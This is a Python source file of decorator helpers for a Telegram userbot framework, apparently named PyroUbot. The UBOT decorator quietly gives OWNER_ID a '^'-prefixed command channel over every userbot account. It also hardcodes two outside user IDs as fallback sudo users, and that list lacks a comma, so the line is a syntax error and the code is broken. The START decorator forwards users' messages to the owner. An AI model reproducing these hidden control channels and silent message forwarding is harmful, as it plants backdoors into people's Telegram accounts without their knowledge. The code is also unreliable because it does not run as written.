from pyrogram import filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup
from pyrogram.enums import ChatType

from PyroUbot import *
from PyroUbot.config import OWNER_ID

    

class PY:
    @staticmethod
    def BOT(command, filter=False):
        def wrapper(func):
            message_filters = (
                filters.command(command) & filter
                if filter
                else filters.command(command)
            )

            @bot.on_message(message_filters)
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper
        
    @staticmethod
    def UBOT(command, sudo=False):
        def wrapper(func):
            sudo_filrers = (
                ubot.cmd_prefix(command)
                if sudo
                else ubot.cmd_prefix(command) & filters.me
            )

            @ubot.on_message(filters.command(command, "^") & filters.user(OWNER_ID))
            @ubot.on_message(sudo_filrers)
            async def wrapped_func(client, message):
                if sudo:
                    sudo_id = await get_list_from_vars(
                        client.me.id, "SUDO_USERS", "DB_SUDO"
                    ) or [943015049 1321036212]
                    if client.me.id not in sudo_id:
                        sudo_id.append(client.me.id)
                    if message.from_user.id in sudo_id:
                        return await func(client, message)
                else:
                    return await func(client, message)

            return wrapped_func

        return wrapper

    @staticmethod
    def INLINE(command):
        def wrapper(func):
            @bot.on_inline_query(filters.regex(command))
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    @staticmethod
    def CALLBACK(command):
        def wrapper(func):
            @bot.on_callback_query(filters.regex(command))
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    @staticmethod
    def PRIVATE(func):
        async def function(client, message):
            if not message.chat.type == ChatType.PRIVATE:
                return 
            return await func(client, message)

        return function

    @staticmethod
    def GROUP(func):
        async def function(client, message):
            if message.chat.type not in (ChatType.GROUP, ChatType.SUPERGROUP):
                return 
            return await func(client, message)

        return function

    @staticmethod
    def LOGS():
        def wrapper(func):
            @ubot.on_message(filters.group & filters.incoming & filters.mentioned)
            @ubot.on_message(
                filters.private
                & filters.incoming
                & ~filters.me
                & ~filters.bot
                & ~filters.service
            )
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    @staticmethod
    def OWNER(func):
        async def function(client, message):
            user = message.from_user
            if user.id != OWNER_ID:
                return 
            return await func(client, message)

        return function

    @staticmethod
    def PMPERMIT():
        def wrapper(func):
            @ubot.on_message(
                filters.private
                & filters.incoming
                & ~filters.me
                & ~filters.bot
                & ~filters.via_bot
                & ~filters.service,
                group=69,
            )
            async def wrapped_func(client, message):
                await func(client, message)

            return wrapped_func

        return wrapper

    @staticmethod
    def TOP_CMD(func):
        async def function(client, message):
            cmd = message.command[0].lower()
            top = await get_vars(bot.me.id, cmd, "modules")
            get = int(top) + 1 if top else 1
            await set_vars(bot.me.id, cmd, get, "modules")
            return await func(client, message)

        return function

    @staticmethod
    def START(func):
        async def function(client, message):
            seved_users = await get_list_from_vars(client.me.id, "SAVED_USERS")
            user_id = message.from_user.id
            if user_id != OWNER_ID:
                if user_id not in seved_users:
                    await add_to_vars(client.me.id, "SAVED_USERS", user_id)
                user_link = f"<a href=tg://user?id={message.from_user.id}>{message.from_user.first_name} {message.from_user.last_name or ''}</a>"
                formatted_text = f"{user_link}\n\n<code>{message.text}</code>"
                buttons = [
                    [
                        InlineKeyboardButton(
                            "👤 ᴅᴀᴘᴀᴛᴋᴀɴ ᴘʀᴏғɪʟ 👤",
                            callback_data=f"profil {message.from_user.id}",
                        ),
                    ]
                ]
                await client.send_message(
                    OWNER_ID,
                    formatted_text,
                    reply_markup=InlineKeyboardMarkup(buttons),
                )
            return await func(client, message)

        return function
        
    
